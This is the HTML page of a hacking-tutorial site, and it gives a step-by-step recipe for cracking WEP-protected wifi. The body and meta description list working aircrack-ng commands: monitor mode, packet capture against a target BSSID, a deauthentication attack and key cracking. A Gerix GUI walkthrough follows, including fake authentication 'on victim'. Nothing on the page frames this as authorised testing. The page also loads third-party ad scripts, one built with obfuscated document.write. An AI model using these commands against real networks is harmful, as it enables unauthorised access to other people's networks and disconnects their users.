<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Crack WEP Encryption</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="1.  Start kali linux and open terminal in kali linux.
2.  Type command : airmon-ng
           (Check weather your wireless card is avilable and working properly)
3.  Type command : airmon-ng start wlan0
           (put your wireless card in monitoring mode as wifi crack is possible in monitoring mode only)
4.  Type command: airodump-ng mon0
            (command to listen to the wireless network around you and get details about them.)
5.  Type command : airodump-ng –w File name of packet –c Target channel no --bssid BSSID of target name mon0
               (  eg: airodump-ng –w MTNL –c 3 --bssid 11:22:33:44:55:66 mon0)
              (command start capturing the packet to crack the wifi password.)
6.  Type command : aireplay-ng -0 0 -a 0C:D2:B5:03:43:68 mon0
           (Above command help to capture the packet more faster. if there is only few packets coming then you can try to deauth to generate more data packets with following command)
7.  Type command:aircrack-ng MTNL-01.cap
            ( AirCrack to crack the WEP key )" />
	<meta name="keywords" content="Crack WEP protected wifi,Crack wifi WEP via gerix" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.12" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1433701545" rel="stylesheet" type="text/css" />
	<link href="css/92.css?ts=1433701545" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance620" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li><li><a href="Book/" target="_self" title="Book">Book</a></li><li><a href="Earn-Money/" target="_self" title="Earn Money">Earn Money</a></li><li><a href="http://haktuts.blogspot.in" target="_self" title="Blog">Blog</a></li><li><a href="https://cse.google.com/cse/publicurl?cx=001639366659799729802:vr921b1tgry#gsc.tab=0&amp;gsc.q=haktuts&amp;gsc.sort=" target="_blank" title="Hackers Search Engine">Hackers Search Engine</a></li></ul></div><div id="wb_element_instance621" class="wb_element"><div></div></div><div id="wb_element_instance622" class="wb_element"><a class="wb_button" href="Home/"><span>HaKTuts</span></a></div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance623" class="wb_element" style=" overflow: hidden;"><script id="airpushScript" type="text/javascript" src="//ab.airpush.com/apportal/client/airpush.js?siteid=263411&amp;testmode=0&amp;banner360=1&amp;banner=slot1&amp;placementid=0&amp;tp=0">
</script><style type="text/css">
            button{
                width: 250px;
                height: 250px;
                
            }
            table{
                border: 0;

            }
            body{
                margin: 0;
                padding: 0;
            }
        </style><table><tbody><tr><td id="error" style="color: red">
                          <img src="https://airpushmarketing.s3.amazonaws.com/abstract_examples_web.gif" width="250px"></td>
                    </tr></tbody></table></div><div id="wb_element_instance624" class="wb_element"><div style="font-size: 1px; overflow: hidden; line-height: 1px; padding: 0; background: transparent; float: none; position: relative; margin: 1px 0 0 0; width: 100%; height: 1px; left: 0; top: 50%; border-top: 1px solid #303030;"></div></div><div id="wb_element_instance625" class="wb_element"><!-- Tags Code For AdPrimary.Com -->
<script type="text/javascript">
document.write('<s'+'cript src="http://c.pioneeringad.com/?adid=8905&adtp=banner&adsz=1&adrd='+new Date().getTime()+'" type="text/javascript">'+'cript>');
</script><!-- End Tags AdPrimary.Com --></div><div id="wb_element_instance627" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1"><span style="color:#454545;">How to Crack WEP protected wifi using backtrack terminal.</span></h1>

<p> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><span style="background-color: transparent;"><strong>1.</strong>  Start kali linux and open terminal in kali linux.</span></span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>2.</strong>  Type command : airmon-ng</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">           (Check weather your wireless card is avilable and working properly)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>3.</strong>  Type command : airmon-ng start wlan0</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">           (put your wireless card in monitoring mode as wifi crack is possible in monitoring mode only)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>4</strong>.  Type command: airodump-ng mon0</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">            (command to listen to the wireless network around you and get details about them.)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>5.</strong>  Type command : airodump-ng –w File name of packet to save –c Target channel no --bssid BSSID of target name mon0</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">               (  eg: airodump-ng –w MTNL-01 –c 3 --bssid 11:22:33:44:55:66 mon0)</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">              (command start capturing the packet to crack the wifi password.)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>6.</strong>  Type command : aireplay-ng -0 0 -a 11:22:33:44:55:66  mon0</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">           (Above command help to capture the packet more faster. if there is only few packets coming then you can try to deauth to generate more data packets with following command)</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>7. </strong> Type command:aircrack-ng MTNL-01.cap</span></p>

<p class="wb-stl-normal"><span style="color:#454545;">            ( AirCrack to crack the WEP key )</span><br><br>
 </p>

<h2 class="wb-stl-heading2"><span style="color:#454545;">How to Crack WEP protected Wifi via Backtrack gerix.</span></h2>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>Open BackTrack 5 R3.</strong></span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Go to Applications &gt; BackTrack &gt; Exploitation Tools &gt; Wireless Exploitation Tools &gt; WLAN Exploitation &gt; gerix-wifi-cracker-ng.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Open Configuration tab.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt; </strong>Select interface from the list and click Enable/Disable Monitor Mode button.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong>scan networks button to get a list of all available wireless networks for all channels.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Select a target wireless network</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Open WEP tab.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Click Start Sniffing and Logging.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Open WEP Attacks (no-client).</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Click button Start false access point Authentication on victim.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> After having collected a few packages (at least 10000packets) cancel and close opened terminal windows.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Open Cracking tab in Gerix.</span></p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"><span style="color:#454545;"><strong>&gt;</strong> Click button, Aircrack-ng – Decrypt WEP password.</span></p>

<p> </p>
</div><div id="wb_element_instance628" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(92);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance628");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance628").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 161px;">
	
<div id="wb_element_instance626" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle">haktuts © 2014. All Rights Reserved </h4>
</div><div id="wb_element_instance629" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>